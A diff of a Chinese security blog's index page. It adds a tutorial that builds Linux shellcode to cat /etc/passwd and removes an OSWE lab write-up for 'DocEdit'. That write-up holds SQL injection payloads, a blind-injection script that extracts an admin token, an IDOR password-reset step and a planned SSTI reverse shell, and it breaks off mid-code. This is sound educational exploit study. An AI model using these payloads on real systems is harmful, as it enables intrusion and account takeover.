@@ -188,6 +188,161 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/03/09/Create-A-Simple-Linux-Shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="n0maj1o24">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Technical Memorandum">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/09/Create-A-Simple-Linux-Shellcode/" class="post-title-link" itemprop="url">Create A Simple Linux Shellcode</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-09 12:48:39" itemprop="dateCreated datePublished" datetime="2022-03-09T12:48:39Z">2022-03-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-12 15:30:04" itemprop="dateModified" datetime="2022-05-12T15:30:04Z">2022-05-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-Exploitation/" itemprop="url" rel="index"><span itemprop="name">Linux Exploitation</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/03/09/Create-A-Simple-Linux-Shellcode/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/03/09/Create-A-Simple-Linux-Shellcode/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这里，学习编写简单的<code>Linux Shellcode</code>。本机的系统内核版本如下：</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/10.png" alt="shellcode"></p>
+<p>利用<code>execve</code>函数来打印<code>/etc/passwd</code>的内容。</p>
+<p>来看一下<code>execve</code>函数的原型：<a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" rel="noopener">https://man7.org/linux/man-pages/man2/execve.2.html</a></p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/9.png" alt="shellcode"></p>
+<p>看一下具体的<code>c</code>语言实现：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">char</span> *ls[<span class="number">3</span>];</span><br><span class="line"> ls[<span class="number">0</span>] = <span class="string">"/bin/cat"</span>;</span><br><span class="line"> ls[<span class="number">1</span>] = <span class="string">"/etc/passwd"</span>;</span><br><span class="line"> ls[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line"> execve(ls[<span class="number">0</span>],ls,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个小程序实现的功能是查看<code>/etc/passwd</code>的内容。</p>
+<p>编译程序（看有的为了反汇编方便，会静态编译程序，我对比了一下，差别不是很大）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o list list.c</span><br></pre></td></tr></table></figure>
+
+<p>先弄明白整个程序的执行过程，开启<code>gdb</code>调试。</p>
+<p>反汇编<code>main</code>函数：</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/1.png" alt="shellcode"></p>
+<p>在<code>(main+68)</code>下断点，然后运行程序。</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/2.png" alt="shellcode"></p>
+<p>查看此时<code>eip</code>的值，指定指向调用<code>execve</code>函数。</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/3.png" alt="shellcode"></p>
+<p>反汇编<code>execve</code>函数：</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/4.png" alt="shellcode"></p>
+<p>在<code>(execve+18)</code>处下断点，继续跟进。</p>
+<p>可以发现内部通过<code>call DWORT PTR gs:0x10</code>执行系统调用中断，进入系统调用。执行<code>__kernel_vsyscall</code>函数。</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/5.png" alt="shellcode"></p>
+<p>查看一下此时各寄存器的值。</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/6.png" alt="shellcode"></p>
+<p>这里，<code>eax</code>保存的是<code>execve</code>函数的系统调用号，<code>ebx</code>保存的是<code>execve</code>函数的第二个参数，<code>ecx</code>保存的是<code>execve</code>函数的第三个参数，<code>edx</code>的值为<code>0</code>。</p>
+<p>注意后续的两条指令，<code>sysenter</code>和<code>int 0x80</code>。通过<code>80</code>中断(软中断)进入系统调用的方式是<code>Linux 2.6</code>之前的做法。指令<code>sysenter</code>是在奔腾<code>(R) II</code>处理器上引入的“快速系统调用”功能的一部分。指令<code>sysenter</code>进行过专门的优化，能够以最佳性能转换到保护环 <code>0(CPL 0)</code>。<code>sysenter</code>是<code>int 0x80</code>的替代品，实现相同的功能。这里稍微有点疑问，为什么会连两条中断进入系统调用的指令，难道现在优先用第一条，如果不行再第二条？</p>
+<p>在<code>32</code>位系统里面，<code>execve</code>函数的系统调用号可以通过如下方式查询：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/7.png" alt="shellcode"></p>
+<p>注意：以上<code>ecx</code>的值其实是一个二阶指针。具体可以看下面：</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/8.png" alt="shellcode"></p>
+<p>到目前为止，程序的整个运行过程基本搞清楚了。现在来写一个汇编实现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">  xor   eax, eax</span><br><span class="line">  mov   edx, eax</span><br><span class="line">  push  edx                  </span><br><span class="line">  push  0x7461632f               </span><br><span class="line">  push  0x6e69622f</span><br><span class="line">  mov   ebx,esp             </span><br><span class="line">  push  edx                  </span><br><span class="line">  push  0x64777373</span><br><span class="line">  push  0x61702f2f</span><br><span class="line">  push  0x6374652f </span><br><span class="line">  mov   ecx,esp               </span><br><span class="line">  push  edx</span><br><span class="line">  push  ecx</span><br><span class="line">  push  ebx</span><br><span class="line">  mov   ecx,esp</span><br><span class="line">  mov   al,0x0b</span><br><span class="line">  int   0x80</span><br></pre></td></tr></table></figure>
+
+<p>上面这段代码里面，注意<code>/bin/cat</code>和<code>/etc/passwd</code>都是按照四个字符一组进行分割，转换成<code>16</code>进制，压入栈中。<code>linux</code>有个地方很有意思<code>/bin/cat</code>和<code>/bin//cat</code>最后解析出来是一样的。这样四个字符一组的时候，出现空缺的字符可以用<code>/</code>代替，毕竟不会影响最后的解析。还要注意大小端的问题。</p>
+<p>编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 call_execve.asm</span><br></pre></td></tr></table></figure>
+
+<p>链接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 -o call_execve call_execve.o</span><br></pre></td></tr></table></figure>
+
+<p>执行效果如下：</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/11.png" alt="shellcode"></p>
+<p>现在，来提取<code>shellcode</code>。参考：<a href="https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump" target="_blank" rel="noopener">https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./call_execve|grep <span class="string">'[0-9a-f]:'</span>|grep -v <span class="string">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">' '</span>|tr -s <span class="string">' '</span>|tr <span class="string">'\t'</span> <span class="string">' '</span>|sed <span class="string">'s/ $//g'</span>|sed <span class="string">'s/ /\\x/g'</span>|paste -d <span class="string">''</span> -s |sed <span class="string">'s/^/"/'</span>|sed <span class="string">'s/$/"/g'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/12.png" alt="shellcode"></p>
+<p>最后，测试一下。这里用到了函数指针的概念。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span></span><br><span class="line">shellcode[]=<span class="string">"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"</span>;</span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> (*(<span class="keyword">void</span> (*)()) shellcode)();</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会出现一个问题，编译之后运行会出现<code>segmentation fault</code>。这个错误的出现与内核版本有关，解决办法可以参考：<a href="https://medium.com/csg-govtech/why-doesnt-my-shellcode-work-anymore-136ce179643f" target="_blank" rel="noopener">https://medium.com/csg-govtech/why-doesnt-my-shellcode-work-anymore-136ce179643f</a></p>
+<p>简而言之，就是把全局变量变为局部变量。我发现改完之后直接编译，运行还是会出错。发现需要编译的时候加上<code>-z execstack</code>，最终才能正常运行。</p>
+<p>最终的测试代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">"\x31\xc0\x89\xc2\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x52\x51\x53\x89\xe1\xb0\x0b\xcd\x80"</span>;</span><br><span class="line">    (*(<span class="keyword">void</span>(*)()) shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译方式如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -g customshellcode.c -o customshellcode</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/13.png" alt="shellcode"></p>
+<p>最终，运行成功：</p>
+<p><img src="/2022/03/09/Create-A-Simple-Linux-Shellcode/14.png" alt="shellcode"></p>
+<p><strong>参考：</strong></p>
+<p>1.<a href="https://www.cnblogs.com/LittleHann/p/4111692.html" target="_blank" rel="noopener">https://www.cnblogs.com/LittleHann/p/4111692.html</a></p>
+<p>2.<a href="http://cybersecurity.ustc.edu.cn/ns/ns09.pdf" target="_blank" rel="noopener">http://cybersecurity.ustc.edu.cn/ns/ns09.pdf</a></p>
+<p>3.<a href="https://www.anquanke.com/post/id/216207" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216207</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2022/03/03/SEH-Overflow-Introduction/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1423,165 +1578,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpeg">
-      <meta itemprop="name" content="n0maj1o24">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Technical Memorandum">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/06/25/OSWE-Lab-DocEdit-Writeup/" class="post-title-link" itemprop="url">DocEdit Writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-06-25 12:07:44" itemprop="dateCreated datePublished" datetime="2021-06-25T12:07:44Z">2021-06-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-14 13:52:07" itemprop="dateModified" datetime="2022-05-14T13:52:07Z">2022-05-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Code-Audit/" itemprop="url" rel="index"><span itemprop="name">Code Audit</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/06/25/OSWE-Lab-DocEdit-Writeup/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/06/25/OSWE-Lab-DocEdit-Writeup/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>访问本lab时，页面如下：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit0.png" alt="docedit0"></p>
-<p>本实验涉及到<code>Like Blind SQL Injection</code>，<code>IDOR</code>，<code>SSTI</code>。</p>
-<p>从<code>SQLi</code>到<code>RCE</code>的流程如下：</p>
-<ol>
-<li>首先需要注册一个普通用户，然后登录。登录之后新建一个<code>Document</code>，保存之后点击该<code>Document</code>最下方的<code>tag</code>按钮，可以指定<code>Document</code>的归属，在这里的<code>User&#39;s Email</code>填写处存在<code>Like Blind SQL Injection</code>。</li>
-<li>利用盲注获取管理员的<code>token</code>。</li>
-<li>在普通用户处有个<code>Edit Profile</code>的功能，填写信息然后<code>Update</code>，<code>Burpsuite</code>拦截该数据包，将用户信息更改为管理员的信息，密码改成我们知道的密码即可。<code>token</code>改为第一步获取的管理员<code>token</code>。</li>
-<li>上一步主要是修改管理员密码，利用修改好的管理员账户密码登录管理员。</li>
-<li>在这里的管理员后台有一个<code>Edit Server Settings</code>的功能，这里可以使用<code>PugJs SSTI</code>反弹<code>Shell</code>，完成<code>RCE</code>操作。</li>
-</ol>
-<p>现在，我们来分析源码。可以发现这是一个<code>NodeJs</code>的应用，采用<code>MVC</code>设计模式。还是从<code>Controller</code>开始分析,但是我们需要结合路有来看。首先来搜索一下，是不是有敏感的<code>SQL</code>语句操作。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd docedit</span><br><span class="line">grep -iRn "select" server-src/ --color</span><br></pre></td></tr></table></figure>
-
-<p>结果如下：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit1.png" alt="docedit1"></p>
-<p>查看源文件：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> searchByEmail = <span class="keyword">async</span> (email) =&gt;  &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">const</span> user = <span class="keyword">await</span> models.sequelize.query(<span class="string">"SELECT * FROM `Users` WHERE email LIKE '"</span> + email + <span class="string">"%'"</span>, &#123; <span class="attr">type</span>: QueryTypes.SELECT &#125;);</span><br><span class="line">		<span class="keyword">if</span> (user.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">		&#125;</span><br><span class="line">	  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Something went wrong during the query"</span>)</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看到<code>email</code>完全没有过滤，这里存在<code>Like Blind SQL Injection</code>。我们继续看是哪里调用了这里的<code>searchByEmail</code>函数。</p>
-<p><code>server-src/routes/ws.js</code>第190-198行：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">socket.on(<span class="string">'checkEmail'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">	userController.searchByEmail(data.email)</span><br><span class="line">	.then(<span class="function">(<span class="params">found</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'emailFound'</span>, found);</span><br><span class="line">	&#125;)</span><br><span class="line">	.catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"error"</span>, <span class="attr">message</span>: error.message&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><code>Burpsuite</code>抓包分析,当访问如下页面时：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit2.png" alt="docedit2"></p>
-<p>对应Burpsuite抓包如下：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit3.png" alt="docedit3"></p>
-<p>这样就找到了漏洞触发点，后续测试发现，不需要新建<code>Document</code>，然后<code>Users</code>下输入邮箱地址，可以直接按照格式请求<code>checkEmail</code>，其中<code>email</code>填写<code>payload</code>即可。</p>
-<p>当邮箱地址匹配数据库中数据时，返回的结果是<code>42[&quot;emailFound&quot;,true]</code>，当匹配不到结果是，返回的结果是<code>42[&quot;emailFound&quot;,false]</code>。这样注入的判断条件也就明确了。</p>
-<p>payload的格式如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b%'or 1=1<span class="comment">#</span></span><br><span class="line">b%'or 1=2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>盲注的脚本如下：（<code>WebSocket</code>同步，异步的不是很好写，也不是太会写）：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blindsql</span><span class="params">(ws, token)</span>:</span></span><br><span class="line">    payload = <span class="string">"b%' or ascii(substr((select token from AuthTokens where id=1),&#123;&#125;,1))=&#123;&#125;#"</span></span><br><span class="line">    pos = <span class="number">1</span></span><br><span class="line">    extracted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ascii_char <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):  <span class="comment"># Iterate over the ascii range of characters.</span></span><br><span class="line">            email = payload.format(pos, ascii_char)</span><br><span class="line">            <span class="comment"># print(email)</span></span><br><span class="line">            data = <span class="string">'42["checkEmail",&#123;&#123;"token":"&#123;token&#125;","email":"&#123;email&#125;"&#125;&#125;]'</span>.format(token=token, email=email)</span><br><span class="line">            <span class="comment"># print(data)</span></span><br><span class="line">            ws.send(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'true'</span> <span class="keyword">in</span> ws.recv():</span><br><span class="line">                print(ascii_char)</span><br><span class="line">                <span class="comment"># print(chr(ascii_char))</span></span><br><span class="line">                extracted += chr(ascii_char)</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> extracted</span><br></pre></td></tr></table></figure>
-
-<p>这里跑出来的结果与数据库保存的结果会有一些偏差，如下所示：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Database Value:  3d7ed80dee5a1febd7880b77cb218582</span><br><span class="line">Script   Value:  4e8fe91eff6b2gfce8991c88dc329693</span><br></pre></td></tr></table></figure>
-
-<p>每个字符都加了<code>1</code>，这是因为<code>websocket</code>同步处理造成的，修正一下代码即可获取正确的值。</p>
-<p>一般这种注入获取的管理员密码都很复杂，破解不了，所以通过获取管理员密码然后进行登录基本不需要考虑。换一种思路。我们来看一下用户的<code>Edit Profile</code>功能。如下所示：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit4.png" alt="docedit4"></p>
-<p>点击<code>Update</code>之后，<code>Burpsuite</code>所抓数据包如下：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit5.png" alt="docedit5"></p>
-<p>第一反应是可能存在IDOR，因为注入可以获取管理员<code>firstName</code>，<code>lastName</code>，<code>email</code>，<code>token</code>。而<code>password1</code>和<code>password2</code>是我们想要更新的值。查看对应的源码<code>server-src/routes/ws.js</code>第217-225行：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">socket.on(<span class="string">'updateProfile'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">	userController.update(socket.locals.user, data.firstName, data.lastName, data.email,data.password1,data.password2)</span><br><span class="line">	.then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"success"</span>, <span class="attr">message</span>: <span class="string">"Your user was updated."</span>&#125;);</span><br><span class="line">	&#125;)</span><br><span class="line">	.catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">	  socket.emit(<span class="string">'message'</span>, &#123;<span class="attr">type</span>: <span class="string">"error"</span>, <span class="attr">message</span>: error.message&#125;);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p><code>client-src/js/controllers.j</code>第101-106行：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">updateProfile(data)&#123;</span><br><span class="line">    data = utils.objectifyForm(data)</span><br><span class="line">    data.token = <span class="keyword">this</span>.socket.locals.user.token</span><br><span class="line">    <span class="keyword">this</span>.socket.emit(<span class="string">'updateProfile'</span>, data)</span><br><span class="line">    <span class="keyword">this</span>.loadingBar.go( <span class="number">30</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对用户权限完全没有限制，也就是说可以用普通用户更改管理员信息。通过这一步更新完管理员密码，我们就可以登录进去了。</p>
-<p>登录管理员之后，查看<code>Edit Server Settings</code>，这里可以渲染<code>Home Page</code>，如下所示：</p>
-<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit6.png" alt="docedit6"></p>
-<p>看一下对应源码：<code>server-src/controllers/pageController.js</code>中第3-28行：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> saveHome = <span class="keyword">async</span> (content) =&gt;  &#123;</span><br><span class="line">	<span class="keyword">const</span> blacklist = [<span class="string">"- "</span>,<span class="string">"require"</span>, <span class="string">"child_process"</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(blacklist.some(<span class="function"><span class="params">v</span> =&gt;</span> content.includes(v)))&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Keyword is not allowed"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">const</span> page = <span class="keyword">await</span> models.Pages.findOne(</span><br><span class="line">		&#123; <span class="attr">where</span>: &#123; <span class="attr">location</span>: <span class="string">'home'</span> &#125; &#125;</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!page)&#123;</span><br><span class="line">		<span class="keyword">await</span> models.Pages.create(&#123;</span><br><span class="line">			location: <span class="string">'home'</span>,</span><br><span class="line">			content: content,</span><br><span class="line">		  &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> data</span><br><span class="line">		  &#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span 